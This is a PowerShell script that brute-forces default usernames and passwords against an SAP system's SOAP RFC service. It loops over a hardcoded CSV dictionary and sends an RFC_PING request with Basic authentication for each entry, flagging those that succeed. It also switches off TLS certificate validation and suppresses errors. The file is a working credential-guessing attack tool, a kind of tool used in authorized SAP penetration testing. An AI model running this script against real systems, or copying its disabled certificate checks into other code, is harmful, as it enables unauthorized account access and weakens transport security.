<#
    .Synopsis
      Default username/password bruteforce attack over SAP SOAP RFC
    .Description
      Adapted from @_Sn0rkY rfc script
      Use the RFC_PING FM, through the /sap/bc/soap/rfc SOAP service,
      to test a list of credentials in dic_rfc.csv
      $target like : http(s)://ip:port
      $csvimport is the hardcoded dictionary
    .Author
      @_1ggy

#>

Param(
[parameter(Mandatory = $true, HelpMessage="target like : http(s)://ip:port")]
[alias("t")]
[string]$target
)

function WriteXmlToScreen ([xml]$xml)
{
    $StringWriter = New-Object System.IO.StringWriter;
    $XmlWriter = New-Object System.Xml.XmlTextWriter $StringWriter;
    $XmlWriter.Formatting = "indented";
    $xml.WriteTo($XmlWriter);
    $XmlWriter.Flush();
    $StringWriter.Flush();
    Write-Output $StringWriter.ToString();
}

function Execute-SOAP-RFC-PING 
{ 
    $pair = "$($username):$($password)"
    
    $encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))
    $basicAuthValue = "Basic $encodedCreds"
    
    $Headers = @{
            'SOAPAction' = 'urn:sap-com:document:sap:rfc:functions'
            'sap-client' = $client 
            'sap-language' = 'EN'
            Authorization = $basicAuthValue
        }
    
    $postParams = '<?xml version="1.0" encoding="utf-8" ?><env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Body><n1:RFC_PING xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"></n1:RFC_PING></env:Body></env:Envelope>'

    Try {
        $soapreq = Invoke-WebRequest $url -Method $method -ContentType "text/xml" -Body $postParams -Headers $Headers
        Write-Host "[*]" $username $password $client "-> SUCCESS"
    }
    Catch {
        Write-Host $username $password $client 
    }
} 

#-Main

# ssl/tls monkey patch
# "Could not establish trust relationship for the SSL/TLS secure channel
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
# error handling
$ErrorActionPreference = "SilentlyContinue"

$url = $target+'/sap/bc/soap/rfc'
$method = 'post'
# hardcoded creds file
$cvsimport = import-csv ..\..\dic_rfc.csv

ForEach($item in $cvsimport)
{
    $username=$item.Username
    $password=$item.Password
    $client=$item.Client
    Execute-SOAP-RFC-PING

}

#-End
